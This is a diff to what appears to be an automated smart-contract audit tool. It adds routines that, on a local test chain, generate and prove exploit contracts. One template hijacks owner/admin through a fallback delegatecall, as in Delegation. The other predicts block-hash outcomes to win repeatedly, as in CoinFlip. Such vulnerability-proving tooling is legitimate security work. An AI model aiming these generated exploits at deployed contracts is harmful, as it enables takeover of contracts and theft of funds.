@@ -1776,6 +1776,253 @@ def _synth_flashloan(target_src, name):
     return out
 
 
+def _default_for_type(t, dummy="0x000000000000000000000000000000000000dEaD"):
+    if t == "address": return dummy
+    if t.startswith("uint") or t.startswith("int"): return 1
+    if t == "bool": return False
+    if re.fullmatch(r"bytes\d+", t): return bytes([0x11]) * int(t[5:])
+    if t == "bytes": return b""
+    if t == "string": return "t404"
+    return None
+
+def _abi_ctor_types(abi):
+    for e in abi:
+        if e.get("type") == "constructor":
+            return [i["type"] for i in e.get("inputs", [])]
+    return []
+
+
+def _proxy_attempt(name, target_src, invariants_src, manifest, scan_step, t0):
+    """2-컨트랙트 배선: 타깃 생성자가 형제 컨트랙트 주소를 받는 시스템을 실제로
+    배선해 배포하고(예: Delegation(delegate)), fallback→delegatecall 을 노리는
+    calldata 셀렉터를 보내 owner/admin 탈취를 성립시킨다."""
+    import solcx
+    from web3 import Web3
+    if not re.search(r"\bfallback\s*\(|delegatecall", target_src):
+        return None
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try:
+        compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception:
+        return None
+    arts = {}
+    for _f, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts:
+        return None
+    bodies = _contract_bodies(_strip_comments(target_src))
+    # 타깃 생성자 파라미터 + 본문의 `SiblingType(param)` 캐스트로 형제 타입 추론
+    tb = bodies.get(name, "")
+    cm = re.search(r"constructor\s*\(([^)]*)\)", tb)
+    params = []
+    if cm and cm.group(1).strip():
+        for p in cm.group(1).split(","):
+            toks = p.split()
+            if len(toks) >= 2:
+                params.append((toks[0], toks[-1]))
+    w3, acct = _mk_evm()
+    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts)>1 else acct
+    def deploy(cn, args, frm, value=0):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        tx = C.constructor(*args).transact({"from":frm,"value":value,"gas":12_000_000})
+        return w3.eth.wait_for_transaction_receipt(tx).contractAddress
+    # 형제 배선
+    cargs = []
+    wired = []
+    for (typ, pname) in params:
+        if typ == "address":
+            m = re.search(r"(\w+)\s*\(\s*" + re.escape(pname) + r"\s*\)", tb)
+            sib = m.group(1) if m else None
+            if sib and sib in arts and sib != name:
+                sargs = [_default_for_type(t) for t in _abi_ctor_types(arts[sib]["abi"])]
+                if any(a is None for a in sargs):
+                    sargs = []
+                try:
+                    saddr = deploy(sib, sargs, deployer)
+                    cargs.append(Web3.to_checksum_address(saddr)); wired.append((pname, sib)); continue
+                except Exception:
+                    pass
+            cargs.append("0x000000000000000000000000000000000000dEaD")
+        else:
+            d = _default_for_type(typ)
+            cargs.append(d if d is not None else 0)
+    if not wired:
+        return None  # 배선된 형제가 없으면 이 경로 의미 없음
+    payable_ctor = _ctor_payable(arts[name]["abi"])
+    try:
+        taddr = deploy(name, cargs, deployer, value=(DEFAULT_SEED_WEI if payable_ctor else 0))
+    except Exception:
+        try: taddr = deploy(name, cargs, deployer)
+        except Exception: return None
+    if taddr is None:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=arts[name]["abi"])
+    o0 = tc.functions.owner().call() if _has_getter(arts[name]["abi"],"owner") else None
+    a0 = tc.functions.admin().call() if _has_getter(arts[name]["abi"],"admin") else None
+    # 모든 컨트랙트의 무인자 함수 셀렉터를 fallback 으로 흘려보낸다
+    sels = []
+    for cn, b in bodies.items():
+        for f in _functions(b):
+            if not f["args"] and f["name"]:
+                sels.append((f["name"], Web3.keccak(text=f"{f['name']}()")[:4].hex()))
+    tester = w3.provider.ethereum_tester; snap = tester.take_snapshot()
+    for fname, sel in sels:
+        tester.revert_to_snapshot(snap)
+        try:
+            w3.eth.send_transaction({"from":acct,"to":taddr,"data":sel,"gas":1_000_000})
+        except Exception:
+            continue
+        o1 = tc.functions.owner().call() if o0 is not None else None
+        a1 = tc.functions.admin().call() if a0 is not None else None
+        reason = None
+        if o0 is not None and o1 != o0: reason = "owner hijacked"
+        elif a0 is not None and a1 != a0: reason = "admin hijacked"
+        if reason:
+            wired_note = ", ".join(f"{p}={s}" for p, s in wired)
+            poc = (HEADER +
+                "// Strategy: 2-contract wiring + proxy calldata — the target's fallback\n"
+                f"// delegatecalls a wired library ({wired_note}); sending {fname}()'s selector\n"
+                "// runs it in the target's storage, seizing owner/admin.\n"
+                "contract Exploit {\n"
+                "    function run(address t) external payable {\n"
+                f"        (bool ok,) = t.call(hex\"{sel[2:] if sel.startswith('0x') else sel}\"); require(ok);  // {fname}()\n"
+                "    }\n"
+                "    receive() external payable {}\n"
+                "}\n")
+            gen = {"step":"generate","title":"Exploit.sol 생성 (proxy-wiring)","strategy":"proxy","exploit_src":poc}
+            return {"name":name,"proven":True,"firstViolated":reason,"strategy":f"proxy:{fname}",
+                    "steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+                    "note":f"형제 컨트랙트를 배선({wired_note})하고 fallback→delegatecall 로 성립시켰습니다.",
+                    "ms":int((time.time()-t0)*1000)}
+    return None
+
+
+def _multiblock_attempt(name, target_src, invariants_src, manifest, scan_step, t0):
+    """다중 블록 러너: 블록 엔트로피로 결과가 정해지는 게임(예: CoinFlip)에서,
+    소스의 결과식을 복제한 공격 컨트랙트를 배포하고 블록을 넘기며 매 블록 올바른
+    값으로 호출해 승리 카운터를 임계까지 올린다."""
+    import solcx
+    from web3 import Web3
+    src = _strip_comments(target_src)
+    if not re.search(r"blockhash|block\.(number|timestamp|prevrandao|difficulty)", src):
+        return None
+    bodies = _contract_bodies(src)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    # 대상 함수: 단일 (bool|uint) 인자 + 본문에서 그 인자와 비교
+    target_fn = None; guess = None; gtype = None
+    for f in _functions(tb):
+        if len(f["args"]) != 1: continue
+        gt, gn = f["args"][0]
+        if not (gt == "bool" or gt.startswith("uint")): continue
+        if re.search(r"block|blockhash", f["body"]) and re.search(re.escape(gn), f["body"]):
+            target_fn, guess, gtype = f, gn, ("bool" if gt=="bool" else "uint256"); break
+    if not target_fn:
+        return None
+    b = target_fn["body"]
+    mcmp = re.search(r"(\w+)\s*==\s*" + re.escape(guess) + r"\b", b) or \
+           re.search(re.escape(guess) + r"\s*==\s*(\w+)", b)
+    if not mcmp:
+        return None
+    answer = mcmp.group(1).strip()
+    # 로컬 정의 + 상태 상수(리터럴 초기화, 재대입 없음) 인라인
+    local = dict(re.findall(r"(?:uint\d*|bool|bytes32|address)\s+(\w+)\s*=\s*([^;]+);", b))
+    consts = {}
+    for cm2 in re.finditer(r"(?:uint\d*|bytes32)\s+(?:public\s+|private\s+|internal\s+)?(?:constant\s+|immutable\s+)?(\w+)\s*=\s*([^;]+);", tb):
+        vn, ve = cm2.group(1), cm2.group(2).strip()
+        if not re.search(r"\b" + re.escape(vn) + r"\s*=", b) and re.fullmatch(r"[0-9a-fx]+", ve.replace(" ","")):
+            consts[vn] = ve
+    subs = dict(local); subs.update(consts)
+    allowed = re.compile(r"^[\s0-9x_a-fA-F()+\-*/%.?:!=<>]|block|blockhash|uint256|uint|keccak256|abi|bytes32|true|false|prevrandao|timestamp|number|difficulty|encodePacked")
+    expr = answer
+    for _ in range(12):
+        ids = set(re.findall(r"[A-Za-z_]\w*", expr))
+        prog = False
+        for idn in ids:
+            if idn in subs:
+                expr = re.sub(r"\b"+re.escape(idn)+r"\b", "("+subs[idn]+")", expr); prog = True
+        if not prog: break
+    leftover = [i for i in re.findall(r"[A-Za-z_]\w*", expr)
+                if i not in ("block","blockhash","uint256","uint","keccak256","abi","bytes32",
+                             "true","false","prevrandao","timestamp","number","difficulty","encodePacked")]
+    if leftover:
+        return None  # block/리터럴만으로 환원 안 됨 → 이 경로로는 못 풂
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    art = None
+    for _f, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            if cn == name: art = {"abi":c["abi"],"bin":c["evm"]["bytecode"]["object"]}
+    if not art: return None
+    abi = art["abi"]
+    counters = [e["name"] for e in abi if e.get("type")=="function" and not e.get("inputs")
+                and e.get("stateMutability") in ("view","pure")
+                and len(e.get("outputs",[]))==1 and e["outputs"][0]["type"].startswith("uint")]
+    fn = target_fn["name"]
+    gexpr = expr if gtype != "bool" else "(" + expr + ")"
+    attacker = (HEADER +
+        f"interface ITarget {{ function {fn}({gtype}) external; }}\n"
+        "contract Attacker {\n"
+        "    ITarget t;\n"
+        "    constructor(address _t) { t = ITarget(_t); }\n"
+        "    function step() external {\n"
+        f"        {gtype} g = {gexpr};\n"
+        f"        t.{fn}(g);\n"
+        "    }\n"
+        "}\n")
+    astd = {"language":"Solidity","sources":{"Attacker.sol":{"content":attacker},f"{name}.sol":{"content":target_src}},
+            "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: acomp = solcx.compile_standard(astd, allow_empty=True)
+    except Exception: return None
+    aart = None
+    for _f, cs in acomp.get("contracts", {}).items():
+        for cn, c in cs.items():
+            if cn == "Attacker": aart = {"abi":c["abi"],"bin":c["evm"]["bytecode"]["object"]}
+    if not aart: return None
+    w3, acct = _mk_evm()
+    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts)>1 else acct
+    tester = w3.provider.ethereum_tester
+    try:
+        dep = manifest.get("deploy", {}); cargs = _coerce_args(dep.get("constructor_args", []), Web3)
+        C = w3.eth.contract(abi=abi, bytecode=art["bin"])
+        seed = DEFAULT_SEED_WEI if _ctor_payable(abi) else 0
+        taddr = w3.eth.wait_for_transaction_receipt(
+            C.constructor(*cargs).transact({"from":deployer,"value":seed,"gas":12_000_000})).contractAddress
+        AC = w3.eth.contract(abi=aart["abi"], bytecode=aart["bin"])
+        aaddr = w3.eth.wait_for_transaction_receipt(
+            AC.constructor(taddr).transact({"from":acct,"gas":12_000_000})).contractAddress
+        att = w3.eth.contract(address=aaddr, abi=aart["abi"])
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    c0 = {c: tc.functions[c]().call() for c in counters}
+    wins = 0
+    for _i in range(15):
+        try: tester.mine_block()
+        except Exception: pass
+        try:
+            att.functions.step().transact({"from":acct,"gas":2_000_000}); wins += 1
+        except Exception:
+            pass
+        if any(tc.functions[c]().call() >= 10 for c in counters):
+            poc = attacker + ("\n// 사용: Attacker 를 배포한 뒤 서로 다른 블록에서 step() 을 10회+\n"
+                              "// 호출한다(각 블록 blockhash 로 결과를 미리 계산해 항상 승리).\n")
+            gen = {"step":"generate","title":"Exploit.sol 생성 (multi-block)","strategy":"multiblock","exploit_src":poc}
+            hitc = next(c for c in counters if tc.functions[c]().call() >= 10)
+            return {"name":name,"proven":True,"firstViolated":f"predictable outcome — {hitc} reached {tc.functions[hitc]().call()}",
+                    "strategy":f"multiblock:{fn}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+                    "note":"블록 엔트로피 결과식을 복제해 다중 블록에 걸쳐 연속 예측했습니다.",
+                    "ms":int((time.time()-t0)*1000)}
+    return None
+
+
 def _storage_attempt(name, target_src, invariants_src, manifest, scan_step, t0):
     """스토리지 보조 익스플로잇: private 변수를 게이트로 쓰는 함수(예: Vault.unlock
     (bytes32))에 대해, 배포된 타깃의 스토리지 슬롯을 오프체인으로 읽어(값이 곧 비밀)
@@ -1980,6 +2227,20 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
     # 0d) 스토리지 보조 익스플로잇 (private 게이트 — 예: Vault.unlock)
     try:
         r = _storage_attempt(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
+    # 0e) 2-컨트랙트 배선 + 프록시 calldata (예: Delegation)
+    try:
+        r = _proxy_attempt(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
+    # 0f) 다중 블록 러너 (예: CoinFlip / Predict the Future)
+    try:
+        r = _multiblock_attempt(name, target_src, invariants_src, manifest, scan_step, t0)
         if r:
             return r
     except Exception:
